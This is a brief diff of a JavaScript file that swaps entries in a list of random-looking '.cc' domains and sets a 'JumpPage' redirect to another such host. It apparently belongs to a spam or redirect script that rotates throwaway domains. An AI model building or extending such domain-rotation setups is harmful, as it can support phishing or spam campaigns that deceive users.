@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[];
-        urls.push(".wexafmgid.cc");   
-        urls.push(".llruwrco.cc");  
-        urls.push(".qxvwrsiyz.cc");    
+        urls.push(".qvtevvoa.cc");   
+        urls.push(".wexafmgid.cc");  
+        urls.push(".llruwrco.cc");    
         
                      	
 var JumpPage="https://cdkqfeko.cc";
